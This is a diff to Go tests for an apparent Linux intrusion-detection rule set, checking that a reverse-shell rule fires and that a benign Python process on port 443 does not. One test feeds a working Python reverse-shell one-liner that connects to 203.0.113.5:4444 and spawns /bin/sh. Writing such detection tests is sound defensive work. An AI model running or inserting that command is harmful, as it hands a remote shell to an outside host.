@@ -64,6 +64,10 @@ func linNet(pid int, comm, dst string) (string, string) {
 		pid, pid, comm, dst)
 }
 
+func linNetLT() string { lt, _ := linNet(0, "", ""); return lt }
+
+func linNetLine(pid int, comm, dst string) string { _, l := linNet(pid, comm, dst); return l }
+
 func linFile(pid, ppid int, image, target string) (string, string) {
 	return "linux_file_event", fmt.Sprintf(`action=create TargetFilename=%s Image=%s Comm="x" PID=%d PPID=%d User=1000`,
 		linKV(target), linKV(image), pid, ppid)
@@ -279,13 +283,14 @@ func TestLinuxReverseShell(t *testing.T) {
 	h2 := newHarness(t, "linux")
 	h2.feed(linExec(710, 1, "/usr/bin/python3.11", `python3.11 -c "import socket,pty;s=socket.socket();s.connect(('203.0.113.5',4444));pty.spawn('/bin/sh')"`, "/bin/bash", 1000))
 	h2.feed(linNet(710, "python3.11", "203.0.113.5"))
-	if got := h2.rules(); len(got) != 1 || got[0] != "ioa_reverse_shell" {
+	// port 4444 from an interpreter is also ioa_dev_odd_port
+	if got := h2.rules(); len(got) == 0 || got[0] != "ioa_reverse_shell" {
 		t.Fatalf("python3.11: %v", got)
 	}
 	// a python program that just talks to an API: nothing
 	h3 := newHarness(t, "linux")
 	h3.feed(linExec(720, 1, "/usr/bin/python3", "python3 /opt/app/sync.py", "/bin/bash", 1000))
-	h3.feed(linNet(720, "python3", "203.0.113.5"))
+	h3.feed(linNetLT(), strings.Replace(linNetLine(720, "python3", "203.0.113.5"), "dport=4444", "dport=443", 1))
 	if len(h3.lines) != 0 {
 		t.Fatalf("benign python: %v", h3.rules())
 	}
